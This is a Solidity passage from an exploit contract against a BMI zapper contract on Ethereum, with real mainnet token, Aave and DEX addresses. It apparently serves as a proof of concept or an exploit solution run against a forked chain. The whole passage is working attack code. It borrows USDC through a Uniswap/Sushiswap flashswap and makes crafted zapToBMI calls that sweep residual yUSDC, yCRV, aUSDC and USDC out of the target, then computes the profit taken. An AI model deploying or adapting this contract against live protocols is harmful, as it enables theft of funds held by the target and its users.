    address internal constant ycrvYBUSD = 0x8ee57c05741aA9DB947A744E713C15d4d19D8822;
    address internal constant ycrvBUSD = 0x6Ede7F19df5df6EF23bD5B9CeDb651580Bdf56Ca;
    address internal constant ycrvUSDP = 0xC4dAf3b5e2A9e93861c3FBDd25f1e943B8D87417;
    address internal constant ycrvFRAX = 0xB4AdA607B9d6b2c9Ee07A275e9616B84AC560139;
    address internal constant ycrvALUSD = 0xA74d4B67b3368E83797a35382AFB776bAAE4F5C8;
    address internal constant ycrvLUSD = 0x5fA5B62c8AF877CB37031e0a3B2f34A78e3C56A6;
    address internal constant ycrvUSDN = 0x3B96d491f067912D18563d56858Ba7d6EC67a6fa;
    address internal constant ycrvIB = 0x27b7b1ad7288079A66d12350c828D3C00A6F07d7;
    address internal constant ycrvThree = 0x84E13785B5a27879921D6F685f041421C7F482dA;
    address internal constant ycrvDUSD = 0x30FCf7c6cDfC46eC237783D94Fc78553E79d4E9C;
    address internal constant ycrvMUSD = 0x8cc94ccd0f3841a468184aCA3Cc478D2148E1757;
    address internal constant ycrvUST = 0x1C6a9783F812b3Af3aBbf7de64c3cD7CC7D1af44;

    address internal constant aUSDC = 0xBcca60bB61934080951369a648Fb03DF4F96263C;

    address internal constant crvY = 0xdF5e0e81Dff6FAF3A7e52BA697820c5e32D806A8;
    address internal constant crvYZap = 0xbBC81d23Ea2c3ec7e56D39296F0cbB648873a5d3;
    address internal constant crvSUSDPool = 0xA5407eAE9Ba41422680e2e00537571bcC53efBfD;

    address internal constant AAVE_LENDING_POOL_V2 = 0x7d2768dE32b0b80b7a3454c06BdAc94A69DDc7A9;

    address internal constant UNISWAP_V2_FACTORY = 0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f;
    address internal constant SUSHISWAP_FACTORY = 0xC0AEe478e3658e2610c5F7A4A2E1777cE9e4f2Ac;

    IBMIZapper internal constant ZAPPER = IBMIZapper(TARGET);

    address[] private _constituents;
    uint256[] private _weightings;

    address private _pair;
    address private _profitToken;
    uint256 private _profitAmount;
    bool private _executed;

    constructor() {}

    function executeOnOpportunity() external {
        if (_executed) {
            return;
        }
        _executed = true;

        address bmi = ZAPPER.BMI();
        uint256 startUSDC = _balanceOf(USDC, address(this));
        uint256 startBMI = _balanceOf(bmi, address(this));

        (address[] memory constituents, uint256[] memory weightings) = _buildWeightings(bmi);
        if (constituents.length == 0 || constituents.length != weightings.length) {
            _setProfit(startUSDC, startBMI, bmi);
            return;
        }

        _constituents = constituents;
        _weightings = weightings;

        if (!_hasAnyResidual(constituents)) {
            _setProfit(startUSDC, startBMI, bmi);
            return;
        }

        address pair = _selectBestBMIUSDCPair(bmi);
        uint256 borrowUSDC = _flashswapSeedAmount(constituents);

        // The fork may already contain exploitable residue. We prefer a tiny real USDC flashswap
        // to enter the same vulnerable branches with nonzero inputs and deterministic repayment.
        if (pair != address(0) && borrowUSDC != 0) {
            _pair = pair;
            (bool flashswapOk, ) = pair.call(_flashswapCalldata(pair, borrowUSDC));
            flashswapOk;
        }

        // Keep the older zero-amount probe as a fallback only when the pair route is absent or fails.
        if (_balanceOf(USDC, address(this)) == startUSDC && _balanceOf(bmi, address(this)) == startBMI) {
            _attemptWithoutFunding(constituents);
        }

        _setProfit(startUSDC, startBMI, bmi);
    }

    function uniswapV2Call(address sender, uint256 amount0, uint256 amount1, bytes calldata) external {
        require(msg.sender == _pair, "bad pair");
        require(sender == address(this), "bad sender");

        uint256 borrowedUSDC = amount0 == 0 ? amount1 : amount0;
        address bmi = ZAPPER.BMI();

        _runFlashswapFundedExploit(borrowedUSDC);

        uint256 sameTokenRepay = _sameTokenRepayAmount(borrowedUSDC);
        uint256 usdcBal = _balanceOf(USDC, address(this));
        if (usdcBal >= sameTokenRepay) {
            _safeTransfer(USDC, _pair, sameTokenRepay);
            return;
        }

        // Repaying the USDC flashswap with BMI avoids an extra sell path. The borrowed USDC only
        // seeds the vulnerable branch; profit is still expected to come from sweeping target residue.
        uint256 bmiRepay = _crossTokenBMIRepay(_pair, borrowedUSDC);
        require(_balanceOf(bmi, address(this)) >= bmiRepay, "insufficient BMI to repay");
        _safeTransfer(bmi, _pair, bmiRepay);
    }

    function profitToken() external view returns (address) {
        return _profitToken;
    }

    function profitAmount() external view returns (uint256) {
        return _profitAmount;
    }

    function _runFlashswapFundedExploit(uint256 borrowedUSDC) internal {
        uint256 oneUSDC = 1e6;
        uint256 fiveUSDC = 5e6;

        if (_balanceOf(yUSDC, TARGET) > 0 && _attackYUSDC(_min(borrowedUSDC, oneUSDC))) {
            return;
        }

        if (_balanceOf(yCRV, TARGET) > 0 && _attackYCRV(_min(_balanceOf(USDC, address(this)), fiveUSDC))) {
            return;
        }

        if (_balanceOf(aUSDC, TARGET) > 0 && _attackAUSDC(_min(_balanceOf(USDC, address(this)), oneUSDC))) {
            return;
        }

        if ((_balanceOf(USDC, TARGET) > 0 || _hasResidualStoredConstituent()) && _attackUSDC(_min(_balanceOf(USDC, address(this)), oneUSDC))) {
            return;
        }
    }

    function _attackYUSDC(uint256 seedUSDC) internal returns (bool) {
        if (seedUSDC == 0) {
            return false;
        }

        address bmi = ZAPPER.BMI();
        uint256 beforeUSDC = _balanceOf(USDC, address(this));
        uint256 beforeBMI = _balanceOf(bmi, address(this));

        _forceApprove(USDC, yUSDC, seedUSDC);
        try IYearn(yUSDC).deposit(seedUSDC) returns (uint256 mintedShares) {
            mintedShares;
        } catch {
            return false;
        }

        uint256 shares = _balanceOf(yUSDC, address(this));
        if (shares == 0) {
            return false;
        }

        _forceApprove(yUSDC, TARGET, shares);
        bool ok = _callZap(yUSDC, shares, USDC);
        if (ok && _realizedSomething(beforeUSDC, beforeBMI, bmi)) {
            return true;
        }

        uint256 residualShares = _balanceOf(yUSDC, address(this));
        if (residualShares > 0) {
            try IYearn(yUSDC).withdraw(residualShares) returns (uint256 recoveredUSDC) {
                recoveredUSDC;
            } catch {}
        }

        return false;
    }

    function _attackYCRV(uint256 seedUSDC) internal returns (bool) {
        if (seedUSDC == 0) {
            return false;
        }

        address bmi = ZAPPER.BMI();
        uint256 beforeUSDC = _balanceOf(USDC, address(this));
        uint256 beforeBMI = _balanceOf(bmi, address(this));

        uint256[4] memory amounts;
        amounts[1] = seedUSDC;

        _forceApprove(USDC, crvYZap, seedUSDC);
        try ICurveZapSimple(crvYZap).add_liquidity(amounts, 0) {} catch {
            return false;
        }

        uint256 crvYBal = _balanceOf(crvY, address(this));
        if (crvYBal == 0) {
            return false;
        }

        _forceApprove(crvY, yCRV, crvYBal);
        try IYearn(yCRV).deposit(crvYBal) returns (uint256 mintedShares) {
            mintedShares;
        } catch {
            return false;
        }

        uint256 shares = _balanceOf(yCRV, address(this));
        if (shares == 0) {
            return false;
        }

        _forceApprove(yCRV, TARGET, shares);
        bool ok = _callZap(yCRV, shares, USDC);
        if (ok && _realizedSomething(beforeUSDC, beforeBMI, bmi)) {
            return true;
        }

        uint256 residualShares = _balanceOf(yCRV, address(this));
        if (residualShares > 0) {
            try IYearn(yCRV).withdraw(residualShares) returns (uint256 recoveredCrvY) {
                if (recoveredCrvY > 0) {
                    _forceApprove(crvY, crvYZap, recoveredCrvY);
                    try ICurveZapSimple(crvYZap).remove_liquidity_one_coin(recoveredCrvY, 1, 0, false) {} catch {}
                }
            } catch {}
        }

        return false;
    }

    function _attackAUSDC(uint256 seedUSDC) internal returns (bool) {
        if (seedUSDC == 0) {
            return false;
        }

        address bmi = ZAPPER.BMI();
        uint256 beforeUSDC = _balanceOf(USDC, address(this));
        uint256 beforeBMI = _balanceOf(bmi, address(this));

        _forceApprove(USDC, AAVE_LENDING_POOL_V2, seedUSDC);
        try IAaveLendingPoolV2(AAVE_LENDING_POOL_V2).deposit(USDC, seedUSDC, address(this), 0) {} catch {
            return false;
        }

        uint256 aBal = _balanceOf(aUSDC, address(this));
        if (aBal == 0) {
            return false;
        }

        _forceApprove(aUSDC, TARGET, aBal);
        bool ok = _callZap(aUSDC, aBal, USDC);
        if (ok && _realizedSomething(beforeUSDC, beforeBMI, bmi)) {
            return true;
        }

        try IAaveLendingPoolV2(AAVE_LENDING_POOL_V2).withdraw(USDC, type(uint256).max, address(this)) returns (uint256 recoveredUSDC) {
            recoveredUSDC;
        } catch {}
        return false;
    }

    function _attackUSDC(uint256 seedUSDC) internal returns (bool) {
        if (seedUSDC == 0) {
            return false;
        }

        address bmi = ZAPPER.BMI();
        uint256 beforeUSDC = _balanceOf(USDC, address(this));
        uint256 beforeBMI = _balanceOf(bmi, address(this));

        _forceApprove(USDC, TARGET, seedUSDC);
        bool ok = _callZap(USDC, seedUSDC, USDC);
        return ok && _realizedSomething(beforeUSDC, beforeBMI, bmi);
    }

    function _callZap(address from, uint256 amount, address fromUnderlying) internal returns (bool) {
        (address[] memory constituents, uint256[] memory weightings) = _basketConfig();
        (bool ok, ) = TARGET.call(
            abi.encodeWithSelector(
                IBMIZapper.zapToBMI.selector,
                from,
                amount,
                fromUnderlying,
                0,
                0,
                constituents,
                weightings,
                address(0),
                bytes(""),
                true
            )
        );
        return ok;
    }

    function _attemptWithoutFunding(address[] memory constituents) internal {
        if (_balanceOf(yUSDC, TARGET) > 0) {
            _callZeroZap(yUSDC, USDC);
        }

        if (_balanceOf(yCRV, TARGET) > 0) {
            _callZeroZap(yCRV, USDC);
        }

        if (_balanceOf(aUSDC, TARGET) > 0) {
            _callZeroZap(aUSDC, USDC);
        }

        if (_balanceOf(USDC, TARGET) > 0 || _hasResidualConstituent(constituents)) {
            _callZeroZap(USDC, USDC);
        }
    }

    function _callZeroZap(address from, address fromUnderlying) internal {
        (address[] memory constituents, uint256[] memory weightings) = _basketConfig();
        (bool ok, ) = TARGET.call(
            abi.encodeWithSelector(
                IBMIZapper.zapToBMI.selector,
                from,
                0,
                fromUnderlying,
                0,
                0,
                constituents,
                weightings,
                address(0),
                bytes(""),
                true
            )
        );
        ok;
    }

    function _buildWeightings(address bmi) internal view returns (address[] memory assets, uint256[] memory weightings) {
        uint256[] memory one;

        try IBasket(bmi).getOne() returns (address[] memory _assets, uint256[] memory _one) {
            assets = _assets;
            one = _one;
        } catch {
            try IBasket(bmi).getAssetsAndBalances() returns (address[] memory _assets, uint256[] memory _balances) {
                assets = _assets;
                one = _balances;
            } catch {
                return (assets, weightings);
            }
        }

        if (assets.length == 0 || assets.length != one.length) {
            return (assets, weightings);
        }

        weightings = new uint256[](assets.length);
        uint256[] memory usdcQuotes = new uint256[](assets.length);
        uint256 totalQuote;

        for (uint256 i = 0; i < assets.length; ++i) {
            usdcQuotes[i] = _quoteUSDC(assets[i], one[i]);
            totalQuote += usdcQuotes[i];
        }

        if (totalQuote == 0) {
            uint256 equalWeight = 1e18 / assets.length;
            uint256 acc;
            for (uint256 i = 0; i + 1 < assets.length; ++i) {
                weightings[i] = equalWeight;
                acc += equalWeight;
            }
            weightings[assets.length - 1] = 1e18 - acc;
            return (assets, weightings);
        }

        uint256 sumWeights;
        for (uint256 i = 0; i + 1 < assets.length; ++i) {
            uint256 w = (usdcQuotes[i] * 1e18) / totalQuote;
            weightings[i] = w;
            sumWeights += w;
        }
        weightings[assets.length - 1] = 1e18 - sumWeights;
    }

    function _quoteUSDC(address asset, uint256 amount) internal view returns (uint256) {
        if (amount == 0) {
            return 0;
        }

        if (_isYearnPrimitive(asset)) {
            uint256 underlying = (amount * IYearn(asset).pricePerShare()) / 1e18;
            if (asset == ySUSD) {
                return ICurvePool(crvSUSDPool).get_dy(3, 1, underlying);
            }
            return _normalizeToUSDC(_yearnUnderlying(asset), underlying);
        }

        if (_isYearnCRV(asset)) {
            try ZAPPER.calcUSDCEquilavent(asset, amount) returns (uint256 quoted) {
                return quoted;
            } catch {
                return 0;
            }
        }

        return _normalizeToUSDC(asset, amount);
    }

    function _basketConfig() internal view returns (address[] memory constituents, uint256[] memory weightings) {
        constituents = _constituents;
        weightings = _weightings;
    }

    function _yearnUnderlying(address asset) internal pure returns (address) {
        if (asset == yDAI) {
            return DAI;
        }
        if (asset == yUSDC) {
            return USDC;
        }
        if (asset == yUSDT) {
            return USDT;
        }
        if (asset == yTUSD) {
            return TUSD;
        }
        return SUSD;
    }

    function _normalizeToUSDC(address asset, uint256 amount) internal view returns (uint256) {
        uint8 decimals;
        try IERC20(asset).decimals() returns (uint8 d) {
            decimals = d;
        } catch {
            return 0;
        }

        if (decimals == 6) {
            return amount;
        }
        if (decimals > 6) {
            return amount / (10 ** (decimals - 6));
        }
        return amount * (10 ** (6 - decimals));
    }

    function _setProfit(uint256 startUSDC, uint256 startBMI, address bmi) internal {
        uint256 endUSDC = _balanceOf(USDC, address(this));
        if (endUSDC > startUSDC) {
            _profitToken = USDC;
            _profitAmount = endUSDC - startUSDC;
            return;
        }

        uint256 endBMI = _balanceOf(bmi, address(this));
        if (endBMI > startBMI) {
            _profitToken = bmi;
            _profitAmount = endBMI - startBMI;
        }
    }

    function _realizedSomething(uint256 beforeUSDC, uint256 beforeBMI, address bmi) internal view returns (bool) {
        return _balanceOf(USDC, address(this)) > beforeUSDC || _balanceOf(bmi, address(this)) > beforeBMI;
    }

    function _flashswapSeedAmount(address[] memory constituents) internal view returns (uint256) {
        if (_balanceOf(yCRV, TARGET) > 0) {
            return 5e6;
        }
        if (
            _balanceOf(yUSDC, TARGET) > 0 ||
            _balanceOf(aUSDC, TARGET) > 0 ||
            _balanceOf(USDC, TARGET) > 0 ||
            _hasResidualConstituent(constituents)
        ) {
            return 1e6;
        }
        return 0;
    }

    function _selectBestBMIUSDCPair(address bmi) internal view returns (address bestPair) {
        uint256 bestReserve;

        address uniPair = IUniswapV2Factory(UNISWAP_V2_FACTORY).getPair(bmi, USDC);
        uint256 uniReserve = _usdcReserve(uniPair);
        if (uniReserve > bestReserve) {
            bestReserve = uniReserve;
            bestPair = uniPair;
        }

        address sushiPair = IUniswapV2Factory(SUSHISWAP_FACTORY).getPair(bmi, USDC);
        uint256 sushiReserve = _usdcReserve(sushiPair);
        if (sushiReserve > bestReserve) {
            bestPair = sushiPair;
        }
    }

    function _flashswapCalldata(address pair, uint256 borrowUSDC) internal view returns (bytes memory) {
        address token0 = IUniswapV2Pair(pair).token0();
        if (token0 == USDC) {
            return abi.encodeWithSelector(IUniswapV2Pair.swap.selector, borrowUSDC, 0, address(this), bytes("F"));
        }
        return abi.encodeWithSelector(IUniswapV2Pair.swap.selector, 0, borrowUSDC, address(this), bytes("F"));
    }

    function _crossTokenBMIRepay(address pair, uint256 borrowedUSDC) internal view returns (uint256) {
        (uint112 reserve0, uint112 reserve1, ) = IUniswapV2Pair(pair).getReserves();
        if (IUniswapV2Pair(pair).token0() == USDC) {
            return _getAmountIn(borrowedUSDC, reserve1, reserve0);
        }
        return _getAmountIn(borrowedUSDC, reserve0, reserve1);
    }

    function _sameTokenRepayAmount(uint256 amountOut) internal pure returns (uint256) {
        return ((amountOut * 1000) / 997) + 1;
    }

    function _getAmountIn(uint256 amountOut, uint256 reserveIn, uint256 reserveOut) internal pure returns (uint256) {
        uint256 numerator = reserveIn * amountOut * 1000;
        uint256 denominator = (reserveOut - amountOut) * 997;
        return (numerator / denominator) + 1;
    }

    function _hasAnyResidual(address[] memory constituents) internal view returns (bool) {
        return
            _balanceOf(yUSDC, TARGET) > 0 ||
            _balanceOf(yCRV, TARGET) > 0 ||
            _balanceOf(aUSDC, TARGET) > 0 ||
            _balanceOf(USDC, TARGET) > 0 ||
            _hasResidualConstituent(constituents);
    }

    function _hasResidualConstituent(address[] memory constituents) internal view returns (bool) {
        for (uint256 i = 0; i < constituents.length; ++i) {
            if (_balanceOf(constituents[i], TARGET) > 0) {
                return true;
            }
        }
        return false;
    }

    function _hasResidualStoredConstituent() internal view returns (bool) {
        for (uint256 i = 0; i < _constituents.length; ++i) {
            if (_balanceOf(_constituents[i], TARGET) > 0) {
                return true;
            }
        }
        return false;
    }

    function _usdcReserve(address pair) internal view returns (uint256) {
        if (pair == address(0)) {
            return 0;
        }

        (uint112 reserve0, uint112 reserve1, ) = IUniswapV2Pair(pair).getReserves();
        if (IUniswapV2Pair(pair).token0() == USDC) {
            return reserve0;
        }
        if (IUniswapV2Pair(pair).token1() == USDC) {
            return reserve1;
        }
        return 0;
    }

    function _forceApprove(address token, address spender, uint256 amount) internal {
        (bool ok0, bytes memory data0) = token.call(abi.encodeWithSelector(IERC20.approve.selector, spender, 0));
        require(ok0 && (data0.length == 0 || abi.decode(data0, (bool))), "approve reset failed");
        (bool ok1, bytes memory data1) = token.call(abi.encodeWithSelector(IERC20.approve.selector, spender, amount));
        require(ok1 && (data1.length == 0 || abi.decode(data1, (bool))), "approve failed");
    }

    function _safeTransfer(address token, address to, uint256 amount) internal {
        (bool ok, bytes memory data) = token.call(abi.encodeWithSelector(IERC20.transfer.selector, to, amount));
        require(ok && (data.length == 0 || abi.decode(data, (bool))), "transfer failed");
    }

    function _balanceOf(address token, address account) internal view returns (uint256) {
        try IERC20(token).balanceOf(account) returns (uint256 bal) {
            return bal;
        } catch {
            return 0;
        }
    }

    function _min(uint256 a, uint256 b) internal pure returns (uint256) {
        return a < b ? a : b;
    }

    function _isYearnPrimitive(address token) internal pure returns (bool) {
        return token == yDAI || token == yUSDC || token == yUSDT || token == yTUSD || token == ySUSD;
    }

    function _isYearnCRV(address token) internal pure returns (bool) {
        return token == yCRV ||
            token == ycrvSUSD ||
            token == ycrvYBUSD ||
            token == ycrvBUSD ||
            token == ycrvUSDP ||
            token == ycrvFRAX ||
            token == ycrvALUSD ||
            token == ycrvLUSD ||
            token == ycrvUSDN ||
            token == ycrvIB ||
            token == ycrvThree ||
            token == ycrvDUSD ||
            token == ycrvMUSD ||
            token == ycrvUST;
    }
}
